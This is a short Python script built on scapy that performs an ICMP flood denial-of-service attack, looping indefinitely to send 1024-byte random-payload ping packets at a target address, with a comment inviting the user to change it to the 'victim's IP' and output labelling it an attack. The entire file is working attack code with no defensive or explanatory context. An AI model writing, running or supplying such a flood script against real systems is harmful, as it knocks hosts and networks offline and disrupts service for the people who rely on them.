from scapy.layers.inet import IP, ICMP
from scapy.sendrecv import send
import time
import os
import random

target_ip = "192.168.64.2"  # Change this to victim's IP
packet_size = 1024  # Size of payload
delay = 0.001  # Time between packets

print(f"[+] Sending ICMP flood to {target_ip}...")

packet = IP(dst=target_ip)/ICMP()/os.urandom(packet_size)

try:
    while True:
        send(packet, verbose=0)
        time.sleep(delay * random.uniform(0.9, 1.2))
except KeyboardInterrupt:
    print("\n[!] Attack stopped by user.")
